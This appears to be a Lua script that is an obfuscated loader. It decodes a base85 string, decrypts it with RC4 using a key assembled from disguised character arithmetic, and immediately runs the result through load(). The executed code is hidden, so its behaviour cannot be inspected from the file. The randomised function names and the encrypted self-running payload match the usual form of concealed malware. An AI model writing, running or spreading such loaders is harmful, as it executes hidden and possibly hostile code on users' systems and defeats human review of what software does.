local pb_str = "@CE=U1tJLf*Cw$*N+rSU=A1vNpeuv^O5LB6GOVdM0j;^Rn~^#oRGpk;0axnpc{Y5Mv(0L`-5)E95RDmBcVT`TAb+*w{I3^{?^wA!FQdx$04%#R2n(X;l|}Y9E)uh2a!j$p2lUHo#%P{(WpSDon$eCQ"

local zgLtjBMl = string.char(142-42,48+41,42+42,30+43,87-39,129-26,96-15,89-37,137-15,106-32,68+42,114-17,93+18,48+24,100+15,90-15,76+37,100-17,15+35,121-23,58+20,104-32,27+26,158-36,74+25,108-25,68-18,138-31,125-42,58+19,111-27,138-29)
local function rSlqhViU(a,b)
    local p,c=1,0
    while a>0 and b>0 do
        local ra,rb=a%2,b%2
        if ra~=rb then c=c+p end
        a,b,p=(a-ra)/2,(b-rb)/2,p*2
    end
    if a<b then a=b end
    while a>0 do
        local ra=a%2 if ra>0 then c=c+p end a,p=(a-ra)/2,p*2
    end
    return c
end
local function HUlVUHVs(s)
    local m,o,p,v,n,c={},{},{52200625,614125,7225,85,1},0,0,"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~"
    for i=1,85 do m[string.byte(c,i)]=i-1 end
    for i=1,#s do
        local x=m[string.byte(s,i)]
        if x then
            v=v+x*p[n+1] n=n+1
            if n==5 then
                table.insert(o,string.char(math.floor(v/16777216),math.floor((v%16777216)/65536),math.floor((v%65536)/256),v%256))
                v,n=0,0
            end
        end
    end
    return table.concat(o)
end
local function GtHSucWe(d,k)
    local s={} for i=0,255 do s[i]=i end
    local j=0
    for i=0,255 do j=(j+s[i]+string.byte(k,(i%#k)+1))%256 s[i],s[j]=s[j],s[i] end
    local i,out=0,{} j=0
    for idx=1,#d do
        i=(i+1)%256 j=(j+s[i])%256 s[i],s[j]=s[j],s[i]
        out[#out+1]=string.char(rSlqhViU(string.byte(d,idx),s[(s[i]+s[j])%256]))
    end
    return table.concat(out)
end
local p_data = GtHSucWe(HUlVUHVs(pb_str), zgLtjBMl)
assert(load(p_data))()
